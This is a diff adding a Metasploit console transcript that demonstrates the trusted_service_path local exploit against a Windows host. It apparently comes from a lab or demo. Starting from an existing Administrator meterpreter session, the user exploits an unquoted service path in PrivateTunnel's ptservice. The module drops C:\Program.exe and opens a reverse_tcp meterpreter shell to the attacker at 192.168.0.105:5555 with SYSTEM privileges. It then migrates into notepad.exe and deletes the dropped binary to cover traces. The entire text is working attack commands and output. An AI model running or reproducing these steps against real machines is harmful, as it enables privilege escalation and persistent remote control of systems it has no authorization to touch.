@@ -1,0 +1,88 @@
+msf exploit(trusted_service_path) > sessions  -l
+
+Active sessions
+===============
+
+  Id  Type                   Information                            Connection
+  --  ----                   -----------                            ----------
+  1   meterpreter x86/win32  USER-3B7A467EE8\Administrator @ USER-3B7A467EE8  192.168.0.105:4444 -> 192.168.0.101:1033 (192.168.0.101)
+
+msf exploit(trusted_service_path) > sessions -i 1
+[*] Starting interaction with 1...
+
+meterpreter > getuid
+Server username: USER-3B7A467EE8\Administrator
+meterpreter > background
+[*] Backgrounding session 1...
+msf exploit(trusted_service_path) > show options 
+
+Module options (exploit/windows/local/trusted_service_path):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SESSION  1                yes       The session to run this module on.
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          yes       Exit technique: seh, thread, process, none
+   LHOST     192.168.0.105    yes       The listen address
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Windows
+
+
+msf exploit(trusted_service_path) > set LPORT 5555
+LPORT => 5555
+msf exploit(trusted_service_path) > exploit
+
+[*] Started reverse handler on 192.168.0.105:5555 
+[*] Finding a vulnerable service...
+[*] Found vulnerable service: ptservice - C:\Program Files\OpenVPN Technologies\PrivateTunnel\ptservice.exe (LocalSystem)
+[*] Placing C:\Program.exe as ptservice
+[*] Writing 73802 bytes to C:\Program.exe...
+[*] Launching service ptservice...
+[*] Sending stage (770048 bytes) to 192.168.0.101
+[*] Meterpreter session 2 opened (192.168.0.105:5555 -> 192.168.0.101:1037) at 2014-07-10 02:44:02 -0400
+[*] Session ID 2 (192.168.0.105:5555 -> 192.168.0.101:1037) processing InitialAutoRunScript 'migrate -f'
+[*] Current server process: Program.exe (3088)
+[*] Spawning notepad.exe process to migrate to
+[+] Migrating to 2720
+[+] Successfully migrated to process 
+[*] Deleting C:\Program.exe
+
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+meterpreter > background
+[*] Backgrounding session 2...
+msf exploit(trusted_service_path) > sessions -l
+
+Active sessions
+===============
+
+  Id  Type                   Information                            Connection
+  --  ----                   -----------                            ----------
+  1   meterpreter x86/win32  USER-3B7A467EE8\Administrator @ USER-3B7A467EE8  192.168.0.105:4444 -> 192.168.0.101:1033 (192.168.0.101)
+  2   meterpreter x86/win32  NT AUTHORITY\SYSTEM @ USER-3B7A467EE8  192.168.0.105:5555 -> 192.168.0.101:1037 (192.168.0.101)
+
+msf exploit(trusted_service_path) > sessions -i 1
+[*] Starting interaction with 1...
+
+meterpreter > getuid
+Server username: USER-3B7A467EE8\Administrator
+meterpreter > background
+[*] Backgrounding session 1...
+msf exploit(trusted_service_path) > sessions -i 2
+[*] Starting interaction with 2...
+
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+meterpreter > 
+
